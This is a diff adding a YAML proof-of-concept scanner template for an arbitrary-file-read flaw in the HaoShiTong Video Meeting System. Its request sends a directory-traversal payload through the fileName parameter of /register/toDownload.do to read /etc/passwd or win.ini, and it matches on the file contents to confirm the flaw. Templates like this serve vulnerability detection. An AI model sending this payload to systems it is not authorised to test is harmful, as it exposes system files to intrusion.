@@ -1,0 +1,19 @@
+id: poc-yaml-haoshitong-video-meeting-arbitrary-file-read
+info:
+  name: HaoShiTong Video Meeting System 文件任意读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: HaoShiTong
+  osprey-id: vb_2021_0028
+variables:
+  v_path: '../../../../../../../../../../../../../../etc/passwd
+
+    ../../../../../../../../../../../../../../windows/win.ini'
+requests:
+- method: GET
+  path: /register/toDownload.do?fileName={{.v_path}}
+  headers: {}
+  expression: "(\ncontains(body, \"root:\") && contains(body, \"/bin\") ||\ncontains(body,\
+    \ \"; for 16-bit app support\") \n) && !contains(body, \"<\")\n"
+transport: http
